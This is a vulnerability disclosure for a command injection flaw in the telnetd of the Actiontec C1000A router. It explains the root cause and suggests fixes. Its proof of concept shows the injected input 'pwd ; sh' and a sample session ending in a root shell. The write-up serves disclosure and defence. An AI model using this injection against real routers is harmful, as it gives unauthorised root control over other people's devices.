# Actiontec C1000A telnetd Command Injection Vulnerability

## High level overview
A command injection vulnerability in the telnetd server allows an authenticated remote attacker to execute arbitrary shell commands as root.

## Root cause analysis
The telnetd in firmware version CAC004-31.30L.95 asks for authentication, which can be set on the web interface of the router. After authentication, the server allows
the user to run a limited custom command set. Some of these commands include standard POSIX commands such as `pwd` and `ps`. The arguments for these commands are directly
sent to system(), for example, typing in `ps aux` would result in running `system("ps aux")`. Using shell special characters, additional commands can be executed. 
Typing in `pwd ; sh`, would result in running `system("pwd ; sh"), which prints the working directory, and then executes a shell. In earlier versions of the firmware, 
the `sh` command could be run directly from the telnet console and it would drop the user directory to a root shell. However, in version CAC004-31.30L.95, the `sh`
command was still present, but locked behind a password which is different from the telnet or administrator password (presumably as a security measure), effectively
disabling the shell.

To fix this, commands from the telnet shell could be sent to exec() instead of system(), so arguments could only be supplied to one program instead of to the shell. 
Another solution would be to filter out special characters such as semicolons, dollar signs, ampersands, and backticks.

## Proof of Concept:
Telnet to the router on port 23 and enter credentials. Type 'pwd ; sh'. A root shell should come up. An example of the output is here:

```
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.
===Actiontec xDSL Router===
Login: admin
Password:
 > pwd ; sh
/


BusyBox v1.17.2 (2018-03-02 10:34:35 CST) built-in shell (ash)
Enter 'help' for a list of built-in commands.

#
```
